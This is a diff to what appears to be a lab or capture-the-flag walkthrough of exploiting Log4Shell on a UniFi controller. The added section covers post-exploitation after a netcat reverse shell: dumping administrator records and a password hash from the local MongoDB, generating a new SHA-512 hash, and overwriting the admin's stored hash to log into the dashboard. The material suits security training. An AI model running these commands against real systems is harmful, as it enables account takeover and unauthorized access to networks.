@@ -139,8 +139,37 @@ curl 'https://example-domain.ui.com:8443/api/login' -X POST -H 'User-Agent: Mozi
 
 In our netcat listener we then obtain a Reverse Shell with access to the victim machine.
 
-> ***The SprocketSecurity post dives deeper on lateral movement which can also be interesting.***
-
 > This [GitHub repository](https://github.com/puzzlepeaches/Log4jUnifi) specifies the same attack on an automated way using a python script.
+
+> ***The SprocketSecurity post dives deeper on lateral movement which can also be interesting. For instance, changing UniFi's login page credentials, so we can enter it and pottentially have access to new devices sitting in the Mesh network.***
+
+Firstly, we can list the contents of the Administrators in MongoDB:
+
+```
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+MongoDB shell version v3.4.4
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.4.4
+{
+"_id" : ObjectId("64750f87f19ea8014a2ceb6d"),
+"name" : "test_user",
+"email" : "admin@hotmail.com",
+"x_shadow" : "$6$msad4FLZ$WwZoWNYAGbcGY3bF8HVBQ.t.69dt/
+ogu1nsmeTjsorz4dBl3Q0Waoya35R.Gm0qEgPoVsUorIhVRVpoiG8cFo/
+",
+"time_created" : NumberLong(1685393287),
+"last_site_name" : "default"
+}
+```
+
+Then, we generate the SHA-512 hash of he password string "mypassword", which will be used in the login page: `mkpasswd -m sha-512 mypassword`.
+
+At last, we update the Administrator's password in MongoDB with the one we created using: `mongo --port 27117 ace --eval ’db.admin.update({"_id":ObjectId
+("ADMIN_OBJECT_ID")},{$set:{"x_shadow":"$6$zsmtIX0rAM.
+G4P8a$TKt4eg15VC11zpQaCVS6nLHdOYOzlfjO5m3Tvle7rtc1SOvMRYTT0jBBnRc
+CqY5lAOLDNst3xfGQdX99GtpD0."}})’`.
+
+We can now successfully use `test_user` as the username and `mypassword` as the password to login in UniFi's dashboard.
+
 
 > There is also the possibility of upgrade to a better shell.
